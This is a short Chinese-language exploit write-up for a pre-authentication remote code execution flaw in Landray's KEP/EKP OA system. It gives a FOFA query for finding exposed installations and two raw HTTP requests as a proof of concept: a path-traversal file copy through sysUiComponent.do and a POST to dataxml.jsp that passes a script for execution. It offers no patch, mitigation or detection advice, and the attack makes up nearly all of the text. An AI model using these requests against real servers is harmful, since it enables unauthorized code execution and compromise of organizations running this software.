# 蓝凌KEP前台RCE漏洞

## fofa

```
app="Landray-OA系统"
```

## poc

copy文件

```yaml
POST /sys/ui/sys_ui_component/sysUiComponent.do HTTP/1.1
Host: xx.xx.xx.xx
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 401
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL7ILSpOdIhIIvL51
Origin: http://www.baidu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X-Requested-With: XMLHttpRequest

------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition: form-data; name="method"

replaceExtend
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition: form-data; name="extendId"

../../../../resource/help/km/review/
------WebKitFormBoundaryL7ILSpOdIhIIvL51
Content-Disposition: form-data; name="folderName"

../../../ekp/sys/common
------WebKitFormBoundaryL7ILSpOdIhIIvL51--
```

![image-20240715104927859](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407152016346.png)

上传文件

```yaml
POST /resource/help/kms/knowledge/dataxml.jsp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
Content-Length: 17392
Content-Type: application/x-www-form-urlencoded

s_bean=ruleFormulaValidate&script=shell&returnType=int&modelName=test
```

![image-20240715105030627](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407152016000.png)